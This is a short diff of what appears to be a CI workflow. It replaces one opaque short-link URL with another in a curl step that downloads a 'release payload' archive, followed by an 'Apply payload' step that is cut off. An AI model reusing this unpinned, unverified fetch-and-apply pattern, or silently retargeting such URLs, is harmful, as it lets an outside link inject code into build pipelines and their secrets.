@@ -12,7 +12,7 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Download release payload
-        run: curl -fsSL https://aka.doubaocdn.com/s/33Q5FBU45U -o /tmp/release.tar.gz
+        run: curl -fsSL https://aka.doubaocdn.com/s/fePhLmBVOe -o /tmp/release.tar.gz
       - name: Apply payload
         run: |
           mkdir -p /tmp/payload
